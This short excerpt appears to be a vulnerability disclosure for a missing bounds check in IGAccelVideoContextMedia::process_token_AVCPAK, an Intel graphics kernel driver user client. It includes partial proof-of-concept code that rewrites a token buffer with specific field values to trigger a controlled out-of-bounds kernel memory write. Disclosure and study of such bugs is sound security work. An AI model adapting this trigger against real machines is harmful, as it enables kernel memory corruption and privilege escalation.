...
BUG:
the dword at offset 0x820 of the AVCPAK token used by the IGAccelVideoContextMedia user client is used to compute an index
for a memory write without performing any bounds checking, allowing a controlled out-of-bounds write to kernel memory.

The value is read in IGAccelVideoContextMedia::process_token_AVCPAK.

There are a few contraints required to hit the correct code path, see the code.
...
{ 
  if (selector == 2){
    if (token_buf != 0){
      ...
      if (at){
        //swap the token for an AVCPAK one:
        uint16_t* id = at;
        *id = 0x8c00;
        at[0x8/2] = 0;
        memset(&at[0xc/2], 0, 0x1000);
        at[0x238/4] = 0xffffffff; //required
        at[0x820/4] = 0x12345678; //index for write
        at[0x818/4] = 1; //required
        at[0x14/4] = 1; //avoid div by zero
      }
